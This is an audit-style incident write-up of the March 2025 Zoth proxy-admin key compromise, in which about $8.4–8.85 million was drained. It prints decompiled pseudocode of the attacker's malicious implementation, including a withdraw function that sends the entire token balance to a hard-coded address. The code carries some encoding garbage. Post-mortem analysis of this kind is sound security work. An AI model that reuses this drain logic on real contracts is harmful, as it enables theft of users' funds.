### [H-1] Proxy-Admin Key Compromise in Zoth (March 21, 2025)

**Description:**
    An attacker compromised an administrative private key controlling Zoth’s proxy contract, allowing them to upgrade it to a malicious implementation. This gave the attacker full control over fund transfers.

**Impact:**
Approximately $8.4–$8.85 million in USD0++ stablecoins were drained. These were converted into 4,223 ETH (worth around $8.3 million at the time) and sent to an external wallet.

**Proof of Concept (PoC):**
The attacker upgraded Zoth’s USD0PPSubVaultUpgradeable proxy contract—via an admin key leak—to point toward a malicious contract. This bypassed any safeguards, enabling immediate and unauthorized fund withdrawal.

```javascript
# Palkeoramix decompiler. 

const unknown52d1902d = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
const unknownad3cb1cc = '5.0.0', 0
const balance = ext_call.return_data

def storage:
  value is uint256 at storage 0
  stor3608 is addr at storage 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
  owner is addr at storage 0x9016d09d72d40fdae2fd8ceac6b6234c7706214fd39c1cd1e609a0528c199300

def value(): # not payable
  return value

def owner(): # not payable
  return owner

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def renounceOwnership(): # not payable
  if owner != caller:
      revert with 0, caller
  owner = 0
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=0)

def transferOwnership(address _newOwner): # not payable
  require calldata.size - 4 >=ΓÇ▓ 32
  require _newOwner == _newOwner
  if owner != caller:
      revert with 0, caller
  require _newOwner
  owner = _newOwner
  log OwnershipTransferred(
        address previousOwner=owner,
        address newOwner=_newOwner)

def withdraw(): # not payable
  if 0x3b33c5cd948be5863b72cb3d6e9c0b36e67d01e5 != caller:
      revert with 0, 'Not me'
  static call this.address.balance() with:
          gas gas_remaining wei
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[0]
  require ext_code.size(0x35d8949372d46b7a3d5a56006ae77b215fc69bc0)
  call 0x35d8949372d46b7a3d5a56006ae77b215fc69bc0.transfer(address to, uint256 tokens) with:
       gas gas_remaining wei
      args 0x3b33c5cd948be5863b72cb3d6e9c0b36e67d01e5, ext_call.return_data[0]
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]

def upgradeToAndCall(address _implementation, bytes _data) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _implementation == _implementation
  require _data <= 18446744073709551615
  require _data + 35 <ΓÇ▓ calldata.size
  if _data.length > 18446744073709551615:
      revert with 'NH{q', 65
  if ceil32(ceil32(_data.length)) + 97 > 18446744073709551615 or ceil32(ceil32(_data.length)) + 97 < 96:
      revert with 'NH{q', 65
  require _data + _data.length + 36 <= calldata.size
  mem[128 len _data.length] = _data[all]
  mem[_data.length + 128] = 0
  if this.address == 0xc89d7894341e13d5067d003af5346b257d861f56:
      revert with 3766259130
  if stor3608 != 0xc89d7894341e13d5067d003af5346b257d861f56:
      revert with 3766259130
  if owner != caller:
      revert with 0, caller
  static call _implementation.0x52d1902d with:
          gas gas_remaining wei
  mem[ceil32(ceil32(_data.length)) + 97] = ext_call.return_data[0]
  if not ext_call.success:
      revert with 0, _implementation
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[0]
  if ext_call.return_data[0] != 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc:
      revert with 0, ext_call.return_data[0]
  if not ext_code.size(_implementation):
      revert with 0, _implementation
  stor3608 = _implementation
  log Upgraded(address nextVersion=_implementation)
  if _data.length <= 0:
      if call.value > 0:
          revert with 3013121951
  else:
      mem[ceil32(ceil32(_data.length)) + ceil32(return_data.size) + 97 len ceil32(_data.length)] = _data[all], ext_call.return_data[_data.length + -ceil32(ceil32(_data.length)) + 31 len ceil32(_data.length) - _data.length]
      mem[ceil32(ceil32(_data.length)) + ceil32(return_data.size) + _data.length + 97] = 0
      delegate _implementation.mem[ceil32(ceil32(_data.length)) + ceil32(return_data.size) + 97 len 4] with:
           gas gas_remaining wei
          args mem[ceil32(ceil32(_data.length)) + ceil32(return_data.size) + 101 len _data.length - 4]
      if not return_data.size:
          if not delegate.return_code:
              if _data.length > 0:
                  revert with _data[all]
              revert with 3602752117
          if not _data.length:
              if not ext_code.size(_implementation):
                  revert with 0, _implementation
      else:
          if not delegate.return_code:
              if return_data.size > 0:
                  revert with ext_call.return_data[0 len return_data.size]
              revert with 3602752117
          if not return_data.size:
              if not ext_code.size(_implementation):
                  revert with 0, _implementation
```